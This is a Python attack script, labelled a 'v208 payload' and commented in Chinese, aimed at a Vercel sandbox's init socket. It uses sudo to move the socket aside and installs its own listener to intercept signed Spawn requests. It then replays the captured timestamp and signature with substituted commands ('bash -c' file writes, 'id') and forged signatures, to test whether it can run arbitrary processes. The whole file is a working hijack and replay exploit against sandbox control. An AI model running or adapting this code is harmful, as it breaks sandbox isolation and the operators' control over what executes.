# -*- coding: utf-8 -*-
"""v208 payload: init.sock hook + 签名覆盖范围终极测试
1. mv init.sock -> 监听
2. 捕获 celld 请求 (bash -c echo v208-mark), 记录 ts/sig
3. proxy 转发(原始字节含 chunked) -> celld 正常
4. 用捕获的 ts/sig 构造重放矩阵:
   A: command=bash args=[-c, echo > /tmp/v208_a]  (改 args)
   B: command=id  (全新 body, 响应含 uid -> spawn 权限)
   C: command=id + 新 ts (测 ts 参与签名)
   D: 原 body + 假签名 (基线)
5. 响应帧解析 + gzip 解压 -> 明文记录
6. 60s -> 恢复"""
import socket, time, os, subprocess, signal, zlib, re

signal.alarm(170)
SOCKPATH = '/run/vercel/share/init.sock'
BAK = SOCKPATH + '.bak'
LOG = '/vercel/sandbox/v208hook.log'
f = open(LOG, 'w', encoding='utf-8', errors='replace')
PATH = '/vercel.sandbox.spawn.v1.SpawnService/Spawn'


def log(s):
    line = '[%.1f] %s' % (time.time(), s)
    f.write(line + '\n')
    f.flush()
    print(line, flush=True)


def recv_more(conn, timeout):
    try:
        conn.settimeout(timeout)
        return conn.recv(65536)
    except Exception:
        return b''


def read_http(conn, timeout=10):
    """读完整 HTTP 消息, 返回 (完整原始字节, 解码后 body)"""
    conn.settimeout(timeout)
    d = b''
    while b'\r\n\r\n' not in d:
        x = recv_more(conn, timeout)
        if not x:
            break
        d += x
        if len(d) > 500000:
            break
    if b'\r\n\r\n' not in d:
        return d, b''
    head, _, rest = d.partition(b'\r\n\r\n')
    hdrs = {}
    for ln in head.split(b'\r\n')[1:]:
        if b':' in ln:
            k, v = ln.split(b':', 1)
            hdrs[k.strip().lower()] = v.strip()
    te = hdrs.get(b'transfer-encoding', b'').lower()
    try:
        cl = int(hdrs.get(b'content-length', b'0'))
    except Exception:
        cl = 0
    raw_all = d
    body = b''
    if b'chunked' in te:
        guard = 0
        while guard < 200:
            while b'\r\n' not in rest:
                x = recv_more(conn, timeout)
                if not x:
                    break
                rest += x
                raw_all += x
            if b'\r\n' not in rest:
                break
            sline, _, rest = rest.partition(b'\r\n')
            try:
                sz = int(sline.split(b';')[0], 16)
            except Exception:
                break
            if sz <= 0:
                while b'\r\n\r\n' not in rest and len(raw_all) < 500000:
                    x = recv_more(conn, timeout)
                    if not x:
                        break
                    rest += x
                    raw_all += x
                break
            while len(rest) < sz + 2:
                x = recv_more(conn, timeout)
                if not x:
                    break
                rest += x
                raw_all += x
            if len(rest) < sz + 2:
                break
            body += rest[:sz]
            rest = rest[sz + 2:]
            guard += 1
    else:
        while len(rest) < cl:
            x = recv_more(conn, timeout)
            if not x:
                break
            rest += x
            raw_all += x
        body = rest[:cl]
    dec = body
    if hdrs.get(b'connect-content-encoding', b'').lower() == b'gzip':
        try:
            dec = zlib.decompress(body, 16 + 15)
        except Exception:
            try:
                dec = zlib.decompress(body)
            except Exception:
                pass
    return raw_all, dec


def frames_to_text(dec):
    out = []
    pos = 0
    while pos + 4 <= len(dec):
        flags = dec[pos]
        ln = int.from_bytes(dec[pos + 1:pos + 4], 'big')
        payload = dec[pos + 4:pos + 4 + ln]
        txt = b''
        try:
            txt = zlib.decompress(payload, 16 + 15)
        except Exception:
            try:
                txt = zlib.decompress(payload)
            except Exception:
                txt = payload
        out.append((flags, txt))
        pos += 4 + ln
    return out


def proxy_full(req, timeout=20):
    up = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
    up.settimeout(timeout)
    up.connect(BAK)
    up.sendall(req)
    raw, dec = read_http(up, timeout)
    up.close()
    return raw, dec


def varint(n):
    out = b''
    while True:
        b = n & 0x7F
        n >>= 7
        if n:
            out += bytes([b | 0x80])
        else:
            return out + bytes([b])


def proto_str(field, s):
    b = s.encode() if isinstance(s, str) else s
    return bytes([field << 3 | 2]) + varint(len(b)) + b


def build_body(command, args, cwd='/vercel/sandbox'):
    proto = proto_str(1, command)
    for a in args:
        proto += proto_str(2, a)
    proto += proto_str(4, cwd)
    return b'\x00\x00\x00\x00' + bytes([len(proto)]) + proto


def build_req(ts, sig, body):
    h = ('POST %s HTTP/1.1\r\nHost: localhost\r\nUser-Agent: connect-go/1.20.0 (go1.25.14)\r\n' % PATH).encode()
    h += b'Content-Length: %d\r\nAccept-Encoding: identity\r\nConnect-Accept-Encoding: gzip\r\n' % len(body)
    h += b'Connect-Protocol-Version: 1\r\nContent-Type: application/connect+proto\r\n'
    h += b'X-Signature: %s\r\nX-Timestamp: %s\r\n\r\n' % (sig.encode(), ts.encode())
    return h + body


def log_resp(tag, raw, dec, timeout=20):
    log('  %s raw %d dec %d: %r' % (tag, len(raw), len(dec), dec[:250]))
    frames = frames_to_text(dec)
    for fi, (flags, txt) in enumerate(frames[:6]):
        log('    %s f%d flags=0x%x: %r' % (tag, fi, flags, txt[:220]))


log('=== hook start ===')
r = subprocess.run(['sudo', '-n', 'mv', SOCKPATH, BAK], capture_output=True, timeout=5)
log('MV rc=%d err=%r' % (r.returncode, r.stderr[:200]))
try:
    os.unlink(SOCKPATH)
except Exception:
    pass
srv = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
srv.bind(SOCKPATH)
srv.listen(16)
srv.settimeout(1)
log('HOOK LISTENING')

end = time.time() + 60
n = 0
while time.time() < end:
    try:
        c, _ = srv.accept()
    except socket.timeout:
        continue
    except Exception as e:
        log('ACCEPT EXC %s' % e)
        break
    n += 1
    req, _ = read_http(c, 8)
    head = req.split(b'\r\n\r\n', 1)[0]
    hdrs = {}
    for ln in head.split(b'\r\n')[1:]:
        if b':' in ln:
            k, v = ln.split(b':', 1)
            hdrs[k.strip().lower()] = v.strip()
    ts = hdrs.get(b'x-timestamp', b'').decode(errors='replace')
    sig = hdrs.get(b'x-signature', b'').decode(errors='replace')
    log('CONN %d ts=%s siglen=%d' % (n, ts, len(sig)))
    body0 = req.split(b'\r\n\r\n', 1)[1] if b'\r\n\r\n' in req else b''
    log('  BODY %r' % body0[:300])
    # 1) proxy 原始转发给 celld
    raw, dec = proxy_full(req)
    log_resp('PROXY', raw, dec)
    try:
        c.sendall(raw)
    except Exception:
        pass
    c.close()
    # 2) 重放矩阵 (只在第一个连接做, 避免重复执行写文件)
    if n == 1 and ts and sig:
        # A: 改 args (bash -c 'echo > /tmp/v208_a')
        ba = build_body('bash', ['-c', 'echo REPLAY-A-OK > /tmp/v208_a && id > /tmp/v208_id'])
        try:
            ra, da = proxy_full(build_req(ts, sig, ba))
            log_resp('A-args', ra, da)
        except Exception as e:
            log('  A-args EXC %s' % e)
        # B: 全新 body command=id
        bb = build_body('id', [])
        try:
            rb, db = proxy_full(build_req(ts, sig, bb))
            log_resp('B-id', rb, db)
        except Exception as e:
            log('  B-id EXC %s' % e)
        # C: command=id + 新 ts
        newts = str(int(time.time()))
        try:
            rc, dc = proxy_full(build_req(newts, sig, bb))
            log_resp('C-newts', rc, dc)
        except Exception as e:
            log('  C-newts EXC %s' % e)
        # D: 原 body + 假签名 (基线)
        try:
            rd, dd = proxy_full(build_req(ts, 'QUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQQ==', body0))
            log_resp('D-fakesig', rd, dd)
        except Exception as e:
            log('  D-fakesig EXC %s' % e)

srv.close()
try:
    os.unlink(SOCKPATH)
except Exception:
    pass
r = subprocess.run(['sudo', '-n', 'mv', BAK, SOCKPATH], capture_output=True, timeout=5)
log('RESTORE rc=%d err=%r' % (r.returncode, r.stderr[:200]))
log('V208_DONE conns=%d' % n)
f.close()
